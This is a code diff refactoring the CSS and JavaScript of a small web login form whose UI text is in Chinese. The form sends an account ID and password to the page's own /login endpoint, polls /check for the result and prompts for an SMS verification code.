@@ -12,49 +12,34 @@
             font-family: Arial, sans-serif;
         }
 
-        .status-box {
-            padding: 15px;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            color: red;
-            font-weight: bold;
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-            margin: auto;
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 2rem;
         }
 
-        .form-container {
+        .form-container,
+        .status-box {
             width: 90%;
             max-width: 400px;
-            margin: auto;
             padding: 20px;
             background-color: white;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
         }
 
-        #submit-button {
-            width: auto;
-            text-align: center;
-            margin-top: 15px;
+        .form-group label {
+            font-size: 0.9rem;
         }
 
         h1 {
             font-size: 1.5rem;
         }
 
-        .form-group label,
-        .form-group input {
-            font-size: 0.9rem;
-        }
-
-        .dialog-content {
-            padding: 20px;
+        #submit-button {
+            width: 100%;
+            margin-top: 15px;
         }
 
         dialog {
@@ -82,12 +67,7 @@
                 font-size: 1.25rem;
             }
 
-            .form-container {
-                padding: 15px;
-            }
-
-            .form-group label,
-            .form-group input {
+            .form-group label {
                 font-size: 0.85rem;
             }
         }
@@ -96,7 +76,7 @@
 
 <body>
     <div class="container">
-        <h1 class="text-center mt-5 mb-4" id="name"></h1>
+        <h1 id="name"></h1>
 
         <div class="form-container">
             <div class="form-group">
@@ -114,9 +94,8 @@
                 <input type="text" class="form-control" id="remarks" name="remarks" />
             </div>
 
-            <button id="submit-button" type="button" class="btn btn-primary btn-block" onclick="sub()">
-                提交
-                <span id="countdown-timer" class="countdown-timer"></span>
+            <button id="submit-button" type="button" class="btn btn-primary btn-block" onclick="submitForm()">
+                提交 <span id="countdown-timer" class="countdown-timer"></span>
             </button>
 
             <div id="uid-display" class="mt-3"></div>
@@ -136,49 +115,43 @@
     <div id="status-box" class="status-box mt-3"></div>
 
     <script>
-        let waitTime = 60;
         let uid = "";
         let countdownInterval = null;
-        let isLoginFlag = false;
-        let isSmsFlag = false;
 
         function resetState() {
             uid = "";
-            clearCountdown();
-            enableSubmitButton();
+            clearInterval(countdownInterval);
             document.getElementById("input1").value = "";
             document.getElementById("input2").value = "";
             document.getElementById("remarks").value = "";
             document.getElementById("uid-display").textContent = "";
             document.getElementById("status-display").textContent = "";
+            document.getElementById("countdown-timer").textContent = "";
+            enableSubmitButton();
         }
 
-        async function sub() {
-            isLoginFlag = false;
-            isSmsFlag = false;
+        async function submitForm() {
             const input1 = document.getElementById("input1").value.trim();
             const input2 = document.getElementById("input2").value.trim();
             const remarks = document.getElementById("remarks").value || "GoDongGoCar";
 
-            if (input1 && input2) {
-                await loginApi(input1, input2, remarks);
-                if (uid) {
-                    startCountdown(waitTime);
-                    document.getElementById("submit-button").disabled = true;
-
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    for (let i = 0; i < waitTime; i++) {
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                        if (!isLoginFlag && !isSmsFlag) {
-                            await check(uid);
-                        } else {
-                            break;
-                        }
-                    }
-                    resetState();
-                }
-            } else {
+            if (!input1 || !input2) {
                 alert("请输入账号和密码");
+                return;
+            }
+
+            await loginApi(input1, input2, remarks);
+
+            if (uid) {
+                startCountdown(60);
+                disableSubmitButton();
+
+                for (let i = 0; i < 30; i++) {
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    const checkStatus = await checkLoginStatus(uid);
+                    if (checkStatus) break;
+                }
+                resetState();
             }
         }
 
@@ -190,156 +163,89 @@
                 countdownTimer.textContent = `(${seconds}s)`;
                 if (seconds <= 0) {
                     clearInterval(countdownInterval);
-                    countdownTimer.textContent = "";
                     enableSubmitButton();
                 }
             }, 1000);
-        }
-
-        function clearCountdown() {
-            clearInterval(countdownInterval);
-            const countdownTimer = document.getElementById("countdown-timer");
-            countdownTimer.textContent = "";
-            enableSubmitButton();
         }
 
         async function loginApi(id, pw, remarks) {
             try {
                 const response = await fetch("/login", {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ id, pw, remarks }),
                 });
-
-                if (response.ok) {
-                    const result = await response.json();
-                    if (result.status === "pass") {
-                        uid = result.uid;
-                        document.getElementById("uid-display").textContent = result.msg;
-                        alert("提交成功");
-                    } else {
-                        alert(result.message);
-                    }
+                const result = await response.json();
+                if (response.ok && result.status === "pass") {
+                    uid = result.uid;
+                    document.getElementById("uid-display").textContent = result.msg;
+                    alert("提交成功");
                 } else {
-                    console.error("Error:", response);
+                    alert(result.message || "登录失败");
                 }
             } catch (error) {
                 console.error("Error:", error);
+                alert("网络错误，请稍后再试");
             }
         }
 
-        async function check(uid) {
+        async function checkLoginStatus(uid) {
             try {
                 const response = await fetch("/check", {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ uid }),
                 });
+                const result = await response.json();
+                document.getElementById("uid-display").textContent = result.msg;
 
-                if (response.ok) {
-                    const result = await response.json();
-                    document.getElementById("uid-display").textContent = result.msg;
-                    switch (result.status) {
-                        case "pass":
-                            isLoginFlag = true;
-                            alert("登录成功");
-                            resetState();
-                            break;
-                        case "pending":
-                            break;
-                        case "error":
-                            if (result.msg.includes("未找到")) {
-                                // 提示重新登录
-                            }
-                            isLoginFlag = true;
-                            alert("登录失败: " + result.msg);
-                            resetState();
-                            break;
-                        case "wrongSMS":
-                            isLoginFlag = true;
-                            alert("验证码错误");
-                            resetState();
-                            break;
-                        case "SMS":
-                            isSmsFlag = true;
-                            openDialog();
-                            break;
-                        default:
-                            console.error("Unexpected status:", result.status);
-                    }
-                } else {
-                    console.error("Error:", response);
+                switch (result.status) {
+                    case "pass":
+                        alert("登录成功");
+                        return true;
+                    case "error":
+                        alert("登录失败: " + result.msg);
+                        return true;
+                    case "wrongSMS":
+                        alert("验证码错误");
+                        return true;
+                    case "SMS":
+                        openDialog();
+                        return true;
                 }
             } catch (error) {
                 console.error("Error:", error);
             }
+            return false;
         }
 
         async function submitSmsCode() {
             const code = document.getElementById("sms-code").value.trim();
-            if (uid && code) {
-                await smsApi(uid, code);
-                isSmsFlag = false;
-
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                if (!isSmsFlag) {
-                    await check(uid);
-                }
-                closeDialog();
-            } else {
+            if (!code) {
                 alert("请输入验证码");
+                return;
             }
-        }
-
-        async function checkStatus() {
-            try {
-                const response = await fetch("/status");
-                if (response.ok) {
-                    const result = await response.json();
-                    document.getElementById("status-box").textContent = result.msg;
-                    document.getElementById("name").textContent = result.data.name;
-                } else {
-                    document.getElementById("status-box").textContent = "Error fetching status.";
-                }
-            } catch (error) {
-                document.getElementById("status-box").textContent = "Error: " + error.message;
-            }
+            await smsApi(uid, code);
+            closeDialog();
         }
 
         async function smsApi(uid, code) {
             try {
                 const response = await fetch("/sms", {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ uid, code }),
                 });
-
-                if (response.ok) {
-                    const result = await response.json();
-                    document.getElementById("uid-display").textContent = result.msg;
-                    switch (result.status) {
-                        case "pass":
-                            alert("提交验证码成功");
-                            break;
-                        case "wrongSMS":
-                            alert("验证码错误");
-                            break;
-                        case "error":
-                            alert("提交验证码失败: " + result.msg);
-                            isSmsFlag = true;
-                            break;
-                        default:
-                            console.error("Unexpected status:", result.status);
-                    }
+                const result = await response.json();
+                document.getElementById("uid-display").textContent = result.msg;
+                if (result.status === "pass") {
+                    alert("提交验证码成功");
+                } else {
+                    alert(result.msg || "验证码错误");
                 }
             } catch (error) {
                 console.error("Error:", error);
+                alert("网络错误，请稍后再试");
             }
         }
 
@@ -353,6 +259,22 @@
 
         function enableSubmitButton() {
             document.getElementById("submit-button").disabled = false;
+        }
+
+        function disableSubmitButton() {
+            document.getElementById("submit-button").disabled = true;
+        }
+
+        async function checkStatus() {
+            try {
+                const response = await fetch("/status");
+                const result = await response.json();
+                document.getElementById("status-box").textContent = result.msg;
+                document.getElementById("name").textContent = result.data.name;
+            } catch (error) {
+                document.getElementById("status-box").textContent = "Error fetching status.";
+                console.error("Error:", error);
+            }
         }
 
         document.addEventListener("DOMContentLoaded", checkStatus);
